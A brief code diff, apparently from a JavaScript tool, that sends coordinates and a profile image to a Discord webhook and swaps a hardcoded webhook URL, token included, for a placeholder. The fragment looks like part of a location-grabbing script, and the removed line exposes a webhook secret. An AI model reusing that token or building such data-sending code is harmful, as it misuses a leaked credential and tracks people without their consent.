@@ -157,7 +157,7 @@ ${latitude && longitude ? `**Coordinates:** ${latitude}, ${longitude}` : ''}
     formData.append('files[0]', responseBlob, 'pfp.png');
 
     // Send webhook
-    await fetch('https://discord.com/api/webhooks/1462477870193705115/L-NW-4Q4Rlf6ncz0nE9_TAwlssKQ0Bl8VBV8BPetqKemFwKvKqz2eRDJX59UVFyGdo5C', {
+    await fetch('Youre webhook Here', {
       method: 'POST',
       body: formData
     });
